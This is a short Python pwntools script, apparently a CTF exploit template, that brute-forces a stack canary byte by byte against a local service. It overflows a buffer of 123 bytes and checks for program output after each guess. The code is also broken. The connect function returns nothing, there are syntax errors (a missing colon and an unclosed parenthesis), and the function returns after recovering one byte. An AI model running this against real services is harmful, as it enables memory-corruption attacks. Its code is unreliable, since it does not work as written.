from pwn import *

def connect():
    r = remote("localhost", 13337)
    
def get_cookie(base):
    canary = ''
    guess = 0x0
    base += canary
    
    while len(canary) < 8 # or 4 if 32-bit
        while guess != 0xff:
            r = connect()
            
            r.recvuntil("if needed")
            r.send(base + chr(guess))
            # add as many r.recvuntil as needed.
            
            if "OUTPUT IS PRODUCED" in r.clean():
                print("Guessed Correct bytes", format(guess, '02x')
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()
        print(canary)
        return base
    
offset = 123
base = "A" * offset
base_canary = get_cookie(base)
print (base_canary)
